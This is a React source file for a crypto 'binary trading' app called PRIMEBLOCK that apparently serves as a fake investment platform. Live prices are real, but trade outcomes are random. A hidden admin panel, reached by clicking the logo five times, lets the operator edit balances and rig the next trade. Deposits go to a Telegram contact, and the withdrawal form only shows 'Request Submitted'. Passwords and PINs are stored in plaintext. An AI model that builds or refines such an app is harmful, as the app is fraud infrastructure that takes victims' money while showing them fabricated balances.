import React, { useState, useEffect } from 'react';
import { ResponsiveContainer, YAxis, AreaChart, Area } from 'recharts';
import './App.css';

function App() {
  // --- DATA PERSISTENCE (LocalStorage) ---
  const [allUsers, setAllUsers] = useState(() => {
    const saved = localStorage.getItem('trading_users');
    return saved ? JSON.parse(saved) : {
      '88135': { id: '88135', email: 'admin@cp88.com', balance: 5000, name: 'Ben Admin', pass: '123', pin: '1111' }
    };
  });

  const [activeId, setActiveId] = useState(() => localStorage.getItem('active_user_id') || null);
  const [isLoggedIn, setIsLoggedIn] = useState(() => localStorage.getItem('is_logged_in') === 'true');

  // --- STATE MANAGEMENT ---
  const [coins, setCoins] = useState([]);
  const [loading, setLoading] = useState(true);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [marketTab, setMarketTab] = useState('crypto'); 
  
  const [showAuth, setShowAuth] = useState(false);
  const [authMode, setAuthMode] = useState('login');
  const [authData, setAuthData] = useState({ email: '', password: '', name: '', pin: '' });

  const [showWithdraw, setShowWithdraw] = useState(false);
  const [withdrawPin, setWithdrawPin] = useState('');
  const [showAdmin, setShowAdmin] = useState(false);
  const [adminSearchId, setAdminSearchId] = useState('');
  const [clickCount, setClickCount] = useState(0);

  const [selectedCoin, setSelectedCoin] = useState(null);
  const [tradeConfig, setTradeConfig] = useState({ time: 30, amount: 10, type: 'Long' });
  const [isTrading, setIsTrading] = useState(false);
  const [countdown, setCountdown] = useState(0); 
  const [tradeResult, setTradeResult] = useState(null);
  const [nextTradeResult, setNextTradeResult] = useState('Random');

  const telegramLink = "https://t.me/PrimeBlockLTS";

  const globalMarkets = [
    { id: 'gold', name: 'Gold', symbol: 'XAU', current_price: 2342.50, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [2330, 2335, 2345, 2340, 2342] } },
    { id: 'silver', name: 'Silver', symbol: 'XAG', current_price: 28.15, image: 'https://cdn-icons-png.flaticon.com/512/5833/5833860.png', sparkline_in_7d: { price: [27.5, 28.0, 27.8, 28.2, 28.15] } },
    { id: 'oil', name: 'Crude Oil', symbol: 'WTI', current_price: 82.40, image: 'https://cdn-icons-png.flaticon.com/512/3014/3014023.png', sparkline_in_7d: { price: [80, 81, 83, 82, 82.4] } },
    { id: 'apple', name: 'Apple Inc.', symbol: 'AAPL', current_price: 189.45, image: 'https://cdn-icons-png.flaticon.com/512/0/747.png', sparkline_in_7d: { price: [185, 187, 188, 190, 189.45] } }
  ];

  // --- LIVE PRICE TICKING (Updates every 10s) ---
  useEffect(() => {
    const fetchPrices = () => {
      fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&sparkline=true')
        .then(res => res.json())
        .then(data => { setCoins(data); setLoading(false); })
        .catch(err => console.error("Fetch error:", err));
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 10000); 
    return () => clearInterval(interval);
  }, []);

  // --- AUTO-SAVE TO BROWSER ---
  useEffect(() => {
    localStorage.setItem('trading_users', JSON.stringify(allUsers));
    localStorage.setItem('active_user_id', activeId || '');
    localStorage.setItem('is_logged_in', isLoggedIn);
  }, [allUsers, activeId, isLoggedIn]);

  const handleAuth = (e) => {
    e.preventDefault();
    if (authMode === 'signup') {
      const newId = '88' + Math.floor(1000 + Math.random() * 9000);
      setAllUsers({ ...allUsers, [newId]: { 
        id: newId, email: authData.email, balance: 0, name: authData.name, pass: authData.password, pin: authData.pin 
      }});
      setActiveId(newId); setIsLoggedIn(true);
    } else {
      const user = Object.values(allUsers).find(u => u.email === authData.email && u.pass === authData.password);
      if (user) { setActiveId(user.id); setIsLoggedIn(true); } else { alert("Invalid Credentials"); }
    }
    setShowAuth(false);
  };

  const startTrade = (type) => {
    if (!isLoggedIn) return setShowAuth(true);
    if (allUsers[activeId].balance < tradeConfig.amount) return alert("Insufficient Balance");
    
    setIsTrading(true);
    setCountdown(tradeConfig.time);
    
    const timer = setInterval(() => {
      setCountdown(p => {
        if (p <= 1) {
          clearInterval(timer);
          return 0;
        }
        return p - 1;
      });
    }, 1000);

    setTimeout(() => {
      const mult = tradeConfig.time === 30 ? 0.15 : tradeConfig.time === 60 ? 0.30 : 0.50;
      let win = nextTradeResult === 'Win' ? true : nextTradeResult === 'Lose' ? false : Math.random() > 0.5;
      const change = win ? tradeConfig.amount * mult : -tradeConfig.amount;
      
      setAllUsers(prev => ({ 
        ...prev, 
        [activeId]: { ...prev[activeId], balance: prev[activeId].balance + change } 
      }));
      
      setTradeResult({ win, change, asset: selectedCoin.symbol.toUpperCase() });
      setIsTrading(false);
      setCurrentPage('result');
    }, tradeConfig.time * 1000);
  };

  // --- PAGE ROUTING ---
  if (currentPage === 'profile') {
    const user = allUsers[activeId] || { id: 'N/A', balance: 0, name: 'Guest' };
    return (
      <div className="profile-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Back</button>
          <h3>Account Center</h3>
          <div style={{width:'40px'}}></div>
        </header>
        <div className="profile-container">
          <div className="profile-card">
            <div className="user-avatar-large">👤</div>
            <h2>{user.name}</h2>
            <p className="user-id-tag">UID: {user.id}</p>
            <div className="balance-display">
              <span>Total Assets (USDT)</span>
              <h1>${user.balance.toLocaleString(undefined, {minimumFractionDigits: 2})}</h1>
            </div>
          </div>
          <div className="profile-actions">
            <button className="deposit-btn" onClick={() => window.open(telegramLink)}>💳 Buy Crypto</button>
            <button className="withdraw-btn" onClick={() => isLoggedIn ? setShowWithdraw(true) : setShowAuth(true)}>📤 Withdraw</button>
          </div>
        </div>
      </div>
    );
  }

  if (currentPage === 'menu') {
    return (
      <div className="menu-page">
        <header className="trade-header no-border">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Close</button>
          <div className="brand-logo" onClick={() => { setClickCount(c => c+1); if(clickCount >= 4) setShowAdmin(true); }}>PRIMEBLOCK</div>
          <div style={{width:'40px'}}></div>
        </header>
        <div className="menu-grid">
          <div className="menu-item glass gold" onClick={() => {setMarketTab('crypto'); setCurrentPage('home');}}><div className="menu-icon">🚀</div><span>Crypto</span></div>
          <div className="menu-item glass blue" onClick={() => {setMarketTab('stocks'); setCurrentPage('home');}}><div className="menu-icon">🏦</div><span>Global</span></div>
          <div className="menu-item glass green" onClick={() => window.open(telegramLink)}><div className="menu-icon">💰</div><span>Deposit</span></div>
          <div className="menu-item glass red" onClick={() => isLoggedIn ? setShowWithdraw(true) : setShowAuth(true)}><div className="menu-icon">💸</div><span>Withdraw</span></div>
          {isLoggedIn && <div className="menu-item glass logout" onClick={() => {setIsLoggedIn(false); setActiveId(null); setCurrentPage('home');}}><div className="menu-icon">🚪</div><span>Logout</span></div>}
        </div>
      </div>
    );
  }

  if (currentPage === 'trade' && selectedCoin) {
    return (
      <div className="trade-page">
        <header className="trade-header">
          <button onClick={() => setCurrentPage('home')} className="back-btn-colored">← Home</button>
          <div className="coin-meta"><strong>{selectedCoin.symbol.toUpperCase()}/USDT</strong></div>
          <div className="live-price-top">${selectedCoin.current_price.toLocaleString()}</div>
        </header>
        {isTrading && <div className="countdown-overlay"><div className="timer-circle"><span className="time-left">{countdown}s</span></div></div>}
        <div className="chart-container">
          <ResponsiveContainer width="100%" height={280}>
            <AreaChart data={selectedCoin.sparkline_in_7d.price.map((p, i) => ({ t: i, v: p }))}>
              <Area type="monotone" dataKey="v" stroke="#f0b90b" fill="rgba(240, 185, 11, 0.1)" strokeWidth={2} />
              <YAxis hide domain={['auto', 'auto']} />
            </AreaChart>
          </ResponsiveContainer>
        </div>
        <div className="trade-controls">
          <div className="control-row">{[30, 60, 120].map(t => (<button key={t} className={tradeConfig.time === t ? 'active' : ''} onClick={() => setTradeConfig({...tradeConfig, time: t})}>{t}s</button>))}</div>
          <div className="amount-section">
            <div className="amount-header"><span>Investment</span><span className="available-bal">Available: ${isLoggedIn ? allUsers[activeId].balance.toLocaleString() : '0.00'}</span></div>
            <div className="amount-input-wrapper">
              <span className="currency-prefix">$</span>
              <input type="number" value={tradeConfig.amount} onChange={(e) => setTradeConfig({...tradeConfig, amount: Number(e.target.value)})} className="advanced-input" />
            </div>
          </div>
          <div className="action-btns"><button className="long-btn" onClick={() => startTrade('Long')} disabled={isTrading}>LONG</button><button className="short-btn" onClick={() => startTrade('Short')} disabled={isTrading}>SHORT</button></div>
        </div>
      </div>
    );
  }

  if (currentPage === 'result') {
    return (
      <div className="result-page">
        <div className={`result-card ${tradeResult.win ? 'win' : 'lose'}`}>
          <h1 className={tradeResult.win ? 'up' : 'down'}>{tradeResult.win ? 'SUCCESS' : 'SETTLED'}</h1>
          <h2>{tradeResult.win ? '+' : '-'}${Math.abs(tradeResult.change).toFixed(2)}</h2>
          <p>{tradeResult.asset} Binary Trade</p>
          <button onClick={() => setCurrentPage('home')} className="buy-btn">Return Home</button>
        </div>
      </div>
    );
  }

  return (
    <div className="app-wrapper">
      <header className="header"><div className="header-icon" onClick={() => setCurrentPage('menu')}>⚙️</div><div className="header-icon" onClick={() => isLoggedIn ? setCurrentPage('profile') : setShowAuth(true)}>👤</div></header>
      <main className="main-content">
        <div className="market-tabs-container">
          <div className={`tab-item ${marketTab === 'crypto' ? 'active-crypto' : ''}`} onClick={() => setMarketTab('crypto')}>Crypto</div>
          <div className={`tab-item ${marketTab === 'stocks' ? 'active-global' : ''}`} onClick={() => setMarketTab('stocks')}>Global</div>
        </div>
        <div className="dashboard-container">
          {loading ? <div className="loading">Loading Markets...</div> : (
          <table className="crypto-table">
            <thead><tr><th>Asset</th><th style={{textAlign:'center'}}>Price</th><th style={{textAlign:'right'}}>Action</th></tr></thead>
            <tbody>{(marketTab === 'crypto' ? coins : globalMarkets).map(asset => (
              <tr key={asset.id} className="price-row">
                <td><div className="asset-cell"><img src={asset.image} width="20" alt="" />{asset.symbol.toUpperCase()}</div></td>
                <td style={{textAlign:'center'}} className="price-flash">${asset.current_price.toLocaleString()}</td>
                <td style={{textAlign:'right'}}><button className="trade-button" onClick={() => { setSelectedCoin(asset); setCurrentPage('trade'); }}>Trade</button></td>
              </tr>))}
            </tbody>
          </table>
          )}
        </div>
      </main>

      {/* --- MODALS --- */}
      {showAuth && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowAuth(false)}>×</button><h2>{authMode === 'login' ? 'Login' : 'Sign Up'}</h2>
          <form onSubmit={handleAuth}>
            {authMode === 'signup' && <input className="login-input" placeholder="Full Name" required onChange={e => setAuthData({...authData, name: e.target.value})} />}
            <input className="login-input" type="email" placeholder="Email" required onChange={e => setAuthData({...authData, email: e.target.value})} />
            <input className="login-input" type="password" placeholder="Password" required onChange={e => setAuthData({...authData, password: e.target.value})} />
            {authMode === 'signup' && <input className="login-input" maxLength="4" placeholder="Withdrawal PIN (4 digits)" required onChange={e => setAuthData({...authData, pin: e.target.value})} />}
            <button className="buy-btn" type="submit">{authMode === 'login' ? 'Sign In' : 'Register'}</button></form>
          <p onClick={() => setAuthMode(authMode === 'login' ? 'signup' : 'login')} className="toggle-auth">{authMode === 'login' ? 'Create Account' : 'Back to Login'}</p></div></div>
      )}

      {showWithdraw && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowWithdraw(false)}>×</button><h2>Withdraw Assets</h2>
          <input className="login-input" type="number" placeholder="Amount (USDT)" />
          <input className="login-input" placeholder="Wallet Address (TRC20)" />
          <input className="login-input" type="password" maxLength="4" placeholder="Security PIN" onChange={e => setWithdrawPin(e.target.value)} />
          <button className="buy-btn" onClick={() => { if(withdrawPin === allUsers[activeId].pin) {alert("Request Submitted"); setShowWithdraw(false);} else {alert("Wrong PIN");} }}>Verify & Submit</button></div></div>
      )}

      {showAdmin && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowAdmin(false)}>×</button><h3>Admin Panel</h3>
          <input className="login-input" placeholder="User ID" onChange={e => setAdminSearchId(e.target.value)} />
          {allUsers[adminSearchId] && (
            <div><p>User: {allUsers[adminSearchId].name}</p>
              <input className="login-input" placeholder="New Balance" onBlur={e => setAllUsers({...allUsers, [adminSearchId]: {...allUsers[adminSearchId], balance: Number(e.target.value)}})} />
              <select className="login-input" onChange={e => setNextTradeResult(e.target.value)}><option value="Random">Normal</option><option value="Win">Win Next</option><option value="Lose">Lose Next</option></select>
            </div>
          )}
        </div></div>
      )}
    </div>
  );
}

export default App;